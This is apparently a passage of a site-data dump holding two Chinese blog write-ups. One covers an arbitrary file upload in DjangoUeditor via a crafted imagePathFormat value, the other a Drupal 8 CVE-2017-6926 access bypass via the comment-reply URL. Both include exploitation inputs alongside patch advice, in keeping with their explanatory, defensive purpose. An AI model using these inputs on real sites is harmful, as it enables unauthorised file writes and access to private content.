class=\"line\">        <span class=\"string\">&quot;uploadvideo&quot;</span>:<span class=\"string\">&quot;videoPathFormat&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    path_format_var=get_path_format_vars()</span><br><span class=\"line\">    path_format_var.update(&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;basename&quot;</span>:upload_original_name,</span><br><span class=\"line\">        <span class=\"string\">&quot;extname&quot;</span>:upload_original_ext[<span class=\"number\">1</span>:],</span><br><span class=\"line\">        <span class=\"string\">&quot;filename&quot;</span>:upload_file_name,</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    <span class=\"comment\">#取得输出文件的路径  OutputPathFormat,OutputPath,OutputFile=get_output_path(request,upload_path_format[action],path_format_var)</span></span><br></pre></td></tr></table></figure>\n<p>注意最后一行，在这里调用了一个get_output_path方法来获得输出文件路径以及各式话后的文件名。</p>\n<p>为什么要注意这个get_output_path方法呢？回想一下，这个漏洞注入点是什么？是imagePathFormat参数，这里传入get_output_path方法的第二个参数upload_path_format[action]值是什么？见下图。</p>\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/diango/4.jpg\" class=\"\"></div>\n当action参数值是uploadimage时，upload_path_format[action]值为 imagePathFormat，imagePathFormat将作为第二个参数的值进入get_output_path方法。\n\n<p>接下来跟进get_output_path方法</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_output_path</span>(<span class=\"params\">request,path_format,path_format_var</span>):</span></span><br><span class=\"line\">    <span class=\"comment\">#取得输出文件的路径</span></span><br><span class=\"line\">    OutputPathFormat=(request.GET.get(path_format,USettings.UEditorSettings[<span class=\"string\">&quot;defaultPathFormat&quot;</span>]) % path_format_var).replace(<span class=\"string\">&quot;\\\\&quot;</span>,<span class=\"string\">&quot;/&quot;</span>)</span><br><span class=\"line\">    OutputPath,OutputFile=os.path.split(OutputPathFormat)</span><br><span class=\"line\">    OutputPath=os.path.join(USettings.gSettings.MEDIA_ROOT,OutputPath)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> OutputFile:<span class=\"comment\">#如果OutputFile为空说明传入的OutputPathFormat没有包含文件名，因此需要用默认的文件名</span></span><br><span class=\"line\">        OutputFile=USettings.UEditorSettings[<span class=\"string\">&quot;defaultPathFormat&quot;</span>] % path_format_var</span><br><span class=\"line\">        OutputPathFormat=os.path.join(OutputPathFormat,OutputFile)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(OutputPath):</span><br><span class=\"line\">        os.makedirs(OutputPath)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ( OutputPathFormat,OutputPath,OutputFile)</span><br></pre></td></tr></table></figure>\n<p>现在path_format的值为imagePathFormat，django中的request.GET.get()方法可以跟两个参数，如果get中可以取得第一个参数的值，则使用第一个的值，如果取不到，则使用第二个配置到的默认值。经过处理后OutputPathFormat的值为uploads/images。</p>\n<p>接下来用os.path.split来将路径和文件名分割，然后分别赋值给OutputPath,OutputFile</p>\n<p>下面就到了漏洞存在的地方了，往下看，下面会判断OutputFile是否为空，为空的话就用标准模板进行格式化，我们这里OutputFile显然为空，最终的文件名会返回一个格式化的名字，如下图</p>\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/diango/5.jpg\" class=\"\"></div>\n具体格式化方法如下：\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_path_format_vars</span>():</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;year&quot;</span>:datetime.datetime.now().strftime(<span class=\"string\">&quot;%Y&quot;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;month&quot;</span>:datetime.datetime.now().strftime(<span class=\"string\">&quot;%m&quot;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;day&quot;</span>:datetime.datetime.now().strftime(<span class=\"string\">&quot;%d&quot;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;date&quot;</span>: datetime.datetime.now().strftime(<span class=\"string\">&quot;%Y%m%d&quot;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;time&quot;</span>:datetime.datetime.now().strftime(<span class=\"string\">&quot;%H%M%S&quot;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;datetime&quot;</span>:datetime.datetime.now().strftime(<span class=\"string\">&quot;%Y%m%d%H%M%S&quot;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;rnd&quot;</span>:random.randrange(<span class=\"number\">100</span>,<span class=\"number\">999</span>)</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n但是，如果我们构造的imagePathFormat参数中的值不是一个单纯的路径，而是一个包含文件名的参数呢？（如imagePathFormat = uploads%2Fimages%2Fhehehe.xxxx）\n显而易见，OutputFile就是我们构造的hehehe.xxxx。\n验证如下\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/diango/6.jpg\" class=\"\"></div>\n经验证，写入的路径也是可以控制的，不仅限于images路径，并且可以覆盖其他的文件。\n</br>\n### 修补防御\n可以通过修改代码，对用户上传的OutputFile类型进行过滤，只允许符合要求的类型进行上传。\n\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>Django是Python世界最有影响力的web框架。</p>\n<p>DjangoUeditor是一款可以在Django应用中集成百度Ueditor HTML编辑器的插件（Ueditor HTML编辑器是百度开源的在线HTML编辑器）。</p>\n<p>DjangoUeditor插件上存在一个漏洞，可以导致任意文件上传。</p>","more":"</br>\n\n<h3 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h3><p>DjangoUeditor &lt; 1.9.143<br></br></p>\n<h3 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h3><p>最近在学习分析python web框架方面的漏洞，恰好看到了WooYun 上2015年的一个关于DjangoUeditor的漏洞，就拿来分析一下。</p>\n<p>不要看这个漏洞距今已经快两年了，笔者认为这个漏洞还是有分析的价值的，因为DjangoUeditor作为一个由百度开发的富文本编辑器Ueditor移植到Django中的组件，它的使用率还是挺高的；再者，DjangoUeditor于2015年1月17号后，再也没有更新过，见github上作者的说明：</p>\n<div align=\"center\"><img src=\"/diango/1.jpg\" class=\"\"></div>\n经笔者测试，现在可以下载使用的1.9.143版本中，依然存在着这个漏洞。因此这个漏洞依然有着一定的影响的。\n\n<p>下面开始正式分析下这个漏洞，根据wooyun上的说明，可以在利用这个插件进行上传图片时，改变imagePathFormat变量的值，即可上传任意文件。</p>\n<p>搭建好环境后，来看一下后台的样式，如下图所示</p>\n<div align=\"center\"><img src=\"/diango/2.jpg\" class=\"\"></div>\n我们来传一张图片并抓包看一下，如下图所示：\n<div align=\"center\"><img src=\"/diango/3.jpg\" class=\"\"></div>\n注意图中两处红圈处，其中一处便是wooyun中提到的imagePathFormat参数，另一处action参数，这个参数在下文中会用到。\n\n<p>可以看出，当上传一个图片（或者是文件）时候，POST提交的路径是/ueditor/controller/，我们看看DjangoUeditor的路由怎么定义的，来看一下后台代码DjangoUeditor/urls.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> django <span class=\"keyword\">import</span> VERSION</span><br><span class=\"line\"><span class=\"keyword\">if</span> VERSION[<span class=\"number\">0</span>:<span class=\"number\">2</span>]&gt;(<span class=\"number\">1</span>,<span class=\"number\">3</span>):</span><br><span class=\"line\">    <span class=\"keyword\">from</span> django.conf.urls <span class=\"keyword\">import</span> patterns, url</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"keyword\">from</span> django.conf.urls.defaults <span class=\"keyword\">import</span> patterns, url</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> views <span class=\"keyword\">import</span> get_ueditor_controller</span><br><span class=\"line\">urlpatterns = patterns(<span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    url(<span class=\"string\">r&#x27;^controller/$&#x27;</span>,get_ueditor_controller)</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p>从urls.py中可以看到，路由定义到views.py中的get_ueditor_controller方法上去了<br>接下来跟到views.py中去，找到get_ueditor_controller方法</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_ueditor_controller</span>(<span class=\"params\">request</span>):</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;获取ueditor的后端URL地址    &quot;&quot;&quot;</span></span><br><span class=\"line\">    action=request.GET.get(<span class=\"string\">&quot;action&quot;</span>,<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    reponseAction=&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;config&quot;</span>:get_ueditor_settings,</span><br><span class=\"line\">        <span class=\"string\">&quot;uploadimage&quot;</span>:UploadFile,</span><br><span class=\"line\">        <span class=\"string\">&quot;uploadscrawl&quot;</span>:UploadFile,</span><br><span class=\"line\">        <span class=\"string\">&quot;uploadvideo&quot;</span>:UploadFile,</span><br><span class=\"line\">        <span class=\"string\">&quot;uploadfile&quot;</span>:UploadFile,</span><br><span class=\"line\">        <span class=\"string\">&quot;catchimage&quot;</span>:catcher_remote_image,</span><br><span class=\"line\">        <span class=\"string\">&quot;listimage&quot;</span>:list_files,</span><br><span class=\"line\">        <span class=\"string\">&quot;listfile&quot;</span>:list_files</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> reponseAction[action](request)</span><br></pre></td></tr></table></figure>\n<p>传入的action参数值是uploadimage，因此接下来return进入对应的UploadFile方法</p>\n<p>跟到UploadFile方法中看一看（已省略中间若干代码）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ef UploadFile(request):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;上传文件&quot;&quot;&quot;</span></span><br><span class=\"line\">    。。。。。。。。。。。。。。。。</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"comment\">#检测保存路径是否存在,如果不存在则需要创建</span></span><br><span class=\"line\">    upload_path_format=&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;uploadfile&quot;</span>:<span class=\"string\">&quot;filePathFormat&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;uploadimage&quot;</span>:<span class=\"string\">&quot;imagePathFormat&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;uploadscrawl&quot;</span>:<span class=\"string\">&quot;scrawlPathFormat&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;uploadvideo&quot;</span>:<span class=\"string\">&quot;videoPathFormat&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    path_format_var=get_path_format_vars()</span><br><span class=\"line\">    path_format_var.update(&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;basename&quot;</span>:upload_original_name,</span><br><span class=\"line\">        <span class=\"string\">&quot;extname&quot;</span>:upload_original_ext[<span class=\"number\">1</span>:],</span><br><span class=\"line\">        <span class=\"string\">&quot;filename&quot;</span>:upload_file_name,</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    <span class=\"comment\">#取得输出文件的路径  OutputPathFormat,OutputPath,OutputFile=get_output_path(request,upload_path_format[action],path_format_var)</span></span><br></pre></td></tr></table></figure>\n<p>注意最后一行，在这里调用了一个get_output_path方法来获得输出文件路径以及各式话后的文件名。</p>\n<p>为什么要注意这个get_output_path方法呢？回想一下，这个漏洞注入点是什么？是imagePathFormat参数，这里传入get_output_path方法的第二个参数upload_path_format[action]值是什么？见下图。</p>\n<div align=\"center\"><img src=\"/diango/4.jpg\" class=\"\"></div>\n当action参数值是uploadimage时，upload_path_format[action]值为 imagePathFormat，imagePathFormat将作为第二个参数的值进入get_output_path方法。\n\n<p>接下来跟进get_output_path方法</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_output_path</span>(<span class=\"params\">request,path_format,path_format_var</span>):</span></span><br><span class=\"line\">    <span class=\"comment\">#取得输出文件的路径</span></span><br><span class=\"line\">    OutputPathFormat=(request.GET.get(path_format,USettings.UEditorSettings[<span class=\"string\">&quot;defaultPathFormat&quot;</span>]) % path_format_var).replace(<span class=\"string\">&quot;\\\\&quot;</span>,<span class=\"string\">&quot;/&quot;</span>)</span><br><span class=\"line\">    OutputPath,OutputFile=os.path.split(OutputPathFormat)</span><br><span class=\"line\">    OutputPath=os.path.join(USettings.gSettings.MEDIA_ROOT,OutputPath)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> OutputFile:<span class=\"comment\">#如果OutputFile为空说明传入的OutputPathFormat没有包含文件名，因此需要用默认的文件名</span></span><br><span class=\"line\">        OutputFile=USettings.UEditorSettings[<span class=\"string\">&quot;defaultPathFormat&quot;</span>] % path_format_var</span><br><span class=\"line\">        OutputPathFormat=os.path.join(OutputPathFormat,OutputFile)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(OutputPath):</span><br><span class=\"line\">        os.makedirs(OutputPath)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ( OutputPathFormat,OutputPath,OutputFile)</span><br></pre></td></tr></table></figure>\n<p>现在path_format的值为imagePathFormat，django中的request.GET.get()方法可以跟两个参数，如果get中可以取得第一个参数的值，则使用第一个的值，如果取不到，则使用第二个配置到的默认值。经过处理后OutputPathFormat的值为uploads/images。</p>\n<p>接下来用os.path.split来将路径和文件名分割，然后分别赋值给OutputPath,OutputFile</p>\n<p>下面就到了漏洞存在的地方了，往下看，下面会判断OutputFile是否为空，为空的话就用标准模板进行格式化，我们这里OutputFile显然为空，最终的文件名会返回一个格式化的名字，如下图</p>\n<div align=\"center\"><img src=\"/diango/5.jpg\" class=\"\"></div>\n具体格式化方法如下：\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_path_format_vars</span>():</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;year&quot;</span>:datetime.datetime.now().strftime(<span class=\"string\">&quot;%Y&quot;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;month&quot;</span>:datetime.datetime.now().strftime(<span class=\"string\">&quot;%m&quot;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;day&quot;</span>:datetime.datetime.now().strftime(<span class=\"string\">&quot;%d&quot;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;date&quot;</span>: datetime.datetime.now().strftime(<span class=\"string\">&quot;%Y%m%d&quot;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;time&quot;</span>:datetime.datetime.now().strftime(<span class=\"string\">&quot;%H%M%S&quot;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;datetime&quot;</span>:datetime.datetime.now().strftime(<span class=\"string\">&quot;%Y%m%d%H%M%S&quot;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;rnd&quot;</span>:random.randrange(<span class=\"number\">100</span>,<span class=\"number\">999</span>)</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n但是，如果我们构造的imagePathFormat参数中的值不是一个单纯的路径，而是一个包含文件名的参数呢？（如imagePathFormat = uploads%2Fimages%2Fhehehe.xxxx）\n显而易见，OutputFile就是我们构造的hehehe.xxxx。\n验证如下\n<div align=\"center\"><img src=\"/diango/6.jpg\" class=\"\"></div>\n经验证，写入的路径也是可以控制的，不仅限于images路径，并且可以覆盖其他的文件。\n</br>\n### 修补防御\n可以通过修改代码，对用户上传的OutputFile类型进行过滤，只允许符合要求的类型进行上传。"},{"title":"Drupal 8 - CVE-2017-6926漏洞详解","date":"2018-04-03T07:34:33.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/drupal.png)\n\n近期，著名的Drupal CMS网站爆出7个漏洞，其中1个严重漏洞CVE-2017-6926，具有发表评论权限的用户可以查看他们无权访问的内容和评论，并且还可以为该内容添加评论。\n\n本篇文章对Drupal 8 - CVE-2017-6926漏洞进行了详细分析。\n\n<!--more-->\n\n## CVE-2017-6926 漏洞详情\n\n先看下drupal官网的通告：\n\nhttps://www.drupal.org/sa-core-2018-001\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/图片-1-2.png)\n\n有发布评论权限的用户，可以查看他们无权访问的内容和评论。\n\n并且还可以为此内容添加评论。\n\n想要触发这个漏洞，必须启用评论系统，并且攻击者必须有权发布评论。\n\n从漏洞描述来看，问题可能出在评论的权限控制上了。\n\n但是这里有一个坑，笔者当时就掉进去了：这里的权限，指的是文章的权限？还是评论的权限呢？是攻击者可以访问他们不公开的评论呢？还是攻击者可以访问不公开的文章的公开评论呢？下面我会详细的分析这个漏洞，并给出上面问题的答案。\n\n漏洞是在8.4.5上解决的，看一下8.4.5修改的内容：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/2-2.png)\n\n这里在CommentController.php（评论控制器）里加上了一个对entity实体是否有view权限的判断。\n\n这个好理解，之前没有对entity的权限进行判断，导致不可view的entity也通过了权限检查，从而导致了越权。\n\n我们看下关于entity的介绍：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/18-1.png)\n\n我们再看下漏洞存在的函数\n\n\\core\\modules\\comment\\src\\Controller\\CommentController.php\n<pre class=\"lang:default decode:true\">public function replyFormAccess(EntityInterface $entity, $field_name, $pid = NULL) {\n  // Check if entity and field exists.\n  $fields = $this-&gt;commentManager-&gt;getFields($entity-&gt;getEntityTypeId());\n  if (empty($fields[$field_name])) {\n    throw new NotFoundHttpException();\n  }\n  $account = $this-&gt;currentUser();\n\n  // Check if the user has the proper permissions.\n  $access = AccessResult::allowedIfHasPermission($account, 'post comments');\n  $status = $entity-&gt;{$field_name}-&gt;status;\n  $access = $access-&gt;andIf(AccessResult::allowedIf($status == CommentItemInterface::OPEN)\n    -&gt;addCacheableDependency($entity));</pre>\n再来看下这个方法的路由\n\n\\core\\modules\\comment\\comment.routing.yml\n<pre class=\"lang:default decode:true\">comment.reply:\n  path: '/comment/reply/{entity_type}/{entity}/{field_name}/{pid}'\n  defaults:\n    _controller: '\\Drupal\\comment\\Controller\\CommentController::getReplyForm'\n    _title: 'Add new comment'\n    pid: ~\n  requirements:\n    _custom_access: '\\Drupal\\comment\\Controller\\CommentController::replyFormAccess'\n  options:\n    parameters:\n      entity:\n        type: entity:{entity_type}\n</pre>\n可见replyFormAccess其实是getReplyForm方法的权限检查模块，传入replyFormAccess方法的参数将会是{entity_type}/{entity}/{field_name}/{pid}\n\n我们实际测一下，访问这个模块，看看发送的参数是什么样子的：\n\n对kingsguard test评论进行评论：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/8-2.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/9-1.png)\n\n注意看url：[http://127.0.0.1/d/drupal4/comment/reply/node/1/comment/1](http://127.0.0.1/d/drupal4/comment/reply/node/1/comment/1)\n\n{entity_type}：node\n\n{entity}：1\n\n{field_name}：comment\n\n{pid}：1\n\n现在可以明确了，传入replyFormAccess里的entity类型是node节点类型，接着下断看下entity的数据\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/5-2.png)\n\n在大概知道$entity是什么之后，我们再来看下补丁代码：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/6-2.png)\n\n可见补丁加了一个判断\n<pre class=\"lang:default decode:true\">andIf(AccessResult::allowedIf($entity-&gt;access('view')));</pre>\n看下allowedIf方法是怎么实现的：\n<pre class=\"lang:default decode:true \">public static function allowedIf($condition) {\n  return $condition ? static::allowed() : static::neutral();\n}</pre>\n可见allowedIf通过传入的参数的True/False来判断是否有权限进行操作。\n\n这样看来，$entity-&gt;access('view')只有True/False两种可能出现的值。\n\n我们在后台下断，并且构造一个$test方法值等于$entity-&gt;access('view')，下断看看$test何时能为False:\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/7-2.png)\n\n首先来找找，关于回复评论处的权限设置:\n\n我们在admin账号下，发表一片名为kingsguard的文章，此文章有一个kingsguard test的评论：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/8-2.png)\n\n我们将kingsguard test 这条评论的权限编辑成不公开\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/9-1.png)\n\n我们用admin账号回复一下这个评论，后台看下$$test = $entity-&gt;access('view');的值：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/10-1.png)\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/11-1.png)\n\n毫无疑问，$test的值是true\n\n现在用另一个账号登录，也访问\n\nhttp://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6这个连接试试：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/12-1.png)\n\n$test仍然为true。\n\n当时笔者就是掉到这个坑里了，明明这条评论设置为不公开，为什么不同用户访问，$entity-&gt;access('view')都是true呢？\n\n后来证明了，其实这里的$entity，指的不是评论，而是这篇文章，$entity-&gt;access('view')也同样不是单条评论的是否有view权限，而是这篇文章是否有view权限。\n\n其实观察url就可以发现这个问题了：\n\nhttp://127.0.0.1/d/drupal4/comment/reply/node/1/comment/6（回复第一篇文章的第六个评论）\n\nhttp://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6（回复第二篇文章的第六个评论）\n\n显然这里的1和2，指的是文章的编号，同时也是entity的编号，那显然entity指的是文章而不是评论。\n\n我们用admin账号编辑kingsguard这篇文章，把published选项的勾去掉：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/13-1.png)\n\n这时候用admin账号回复kingsguard test这条评论：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/14-1.png)\n\n对于admin账号来说，$entity-&gt;access('view');仍为true\n\n再用其他账号登录：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/15-1.png)\n\n因为admin账号发布的文章都被admin账号设置为不公开了，所以这里看不到任何文章。\n\n继续用这个账号访问：\n\nhttp://127.0.0.1/d/drupal4/comment/reply/node/2/comment/6\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/16-1.png)\n\n**可以看到，虽然文章不公开，仍然可以看到不公开文章的评论，并且还能对评论进行回复。**\n\n再看下后台下的断点：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/17-1.png)\n\n此时的$entity-&gt;access('view')变成了false\n\n## **CVE-2017-6926 利用验证**\n\n假设id为{node_id}的文章被作者设置为不公开，想查看/回复此文章的id为{comment_id}的评论。\n\n访问[http://x.x.x.x/comment/reply/node/{node_id}/comment/{comment_id}](http://x.x.x.x/comment/reply/node/%7bnode_id%7d/comment/%7bcomment_id%7d)\n\n## CVE-2017-6926 漏洞修复\n\n升级Drupal至最新版本","source":"_posts/drupal8-cve-2017-6926.md","raw":"---\ntitle: Drupal 8 - CVE-2017-6926漏洞详解\ndate: 2018-04-3 15:34:33\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/03/drupal.png)\n\n近期，著名的Drupal CMS网站爆出7个漏洞，其中1个严重漏洞CVE-2017-6926，具有发表评论权限的用户可以查看他们无权访问的内容和评论，并且还可以为该内容添加评论。\n\n本篇文章对Drupal 8 - CVE-2017-6926漏洞进行了详细分析。\n\n<!--more-->\n\n## CVE-2017-6926 漏洞详情\n\n先看下drupal官网的通告：\n\nhttps://www.drupal.org/sa-core-2018-001\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/图片-1-2.png)\n\n有发布评论权限的用户，可以查看他们无权访问的内容和评论。\n\n并且还可以为此内容添加评论。\n\n想要触发这个漏洞，必须启用评论系统，并且攻击者必须有权发布评论。\n\n从漏洞描述来看，问题可能出在评论的权限控制上了。\n\n但是这里有一个坑，笔者当时就掉进去了：这里的权限，指的是文章的权限？还是评论的权限呢？是攻击者可以访问他们不公开的评论呢？还是攻击者可以访问不公开的文章的公开评论呢？下面我会详细的分析这个漏洞，并给出上面问题的答案。\n\n漏洞是在8.4.5上解决的，看一下8.4.5修改的内容：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/2-2.png)\n\n这里在CommentController.php（评论控制器）里加上了一个对entity实体是否有view权限的判断。\n\n这个好理解，之前没有对entity的权限进行判断，导致不可view的entity也通过了权限检查，从而导致了越权。\n\n我们看下关于entity的介绍：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/18-1.png)\n\n我们再看下漏洞存在的函数\n\n\\core\\modules\\comment\\src\\Controller\\CommentController.php\n<pre class=\"lang:default decode:true\">public function replyFormAccess(EntityInterface $entity, $field_name, $pid = NULL) {\n  // Check if entity and field exists.\n  $fields = $this-&gt;commentManager-&gt;getFields($entity-&gt;getEntityTypeId());\n  if (empty($fields[$field_name])) {\n    throw new NotFoundHttpException();\n  }\n  $account = $this-&gt;currentUser();\n\n  // Check if the user has the proper permissions.\n  $access = AccessResult::allowedIfHasPermission($account, 'post comments');\n  $status = $entity-&gt;{$field_name}-&gt;status;\n  $access = $access-&gt;andIf(AccessResult::allowedIf($status == CommentItemInterface::OPEN)\n    -&gt;addCacheableDependency($entity));</pre>\n再来看下这个方法的路由\n\n\\core\\modules\\comment\\comment.routing.yml\n<pre class=\"lang:default 